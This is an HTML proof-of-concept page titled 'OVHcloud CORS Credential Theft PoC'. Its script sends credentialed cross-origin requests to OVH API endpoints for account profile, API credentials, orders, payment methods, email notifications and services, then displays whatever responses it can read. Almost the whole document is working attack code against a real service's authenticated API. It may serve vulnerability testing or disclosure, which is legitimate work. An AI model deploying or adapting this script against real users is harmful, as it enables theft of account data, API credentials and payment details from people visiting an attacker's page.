<!DOCTYPE html>
<html>
<head>
  <title>OVH CORS PoC</title>
  <style>
    body { background:#000; color:#0f0; font-family: monospace; padding:20px; }
    pre { border:1px solid #0f0; padding:10px; }
  </style>
</head>
<body>
<h2>OVHcloud CORS Credential Theft PoC</h2>
<p>If this page (served from a non-OVH domain) can read authenticated OVH API responses, CORS is broken.</p>

<pre id="out">Runningâ€¦</pre>

<script>
async function run() {
  const out = document.getElementById("out");
  let text = "";

  const endpoints = [
    "https://api.ovh.com/1.0/me",
    "https://api.ovh.com/1.0/me/api/credential",
    "https://api.ovh.com/1.0/me/order",
    "https://api.ovh.com/1.0/me/paymentMethod",
    "https://api.ovh.com/1.0/me/notification/email",
    "https://api.ovh.com/1.0/me/services"
  ];

  for (const url of endpoints) {
    try {
      const res = await fetch(url, { method: "GET", credentials: "include" });
      const body = await res.text();
      text += `===== ${url} =====\nSTATUS: ${res.status}\n${body}\n\n`;
    } catch (err) {
      text += `===== ${url} =====\nERROR: ${err}\n\n`;
    }
  }

  out.textContent = text;
}
run();
</script>
</body>
</html>
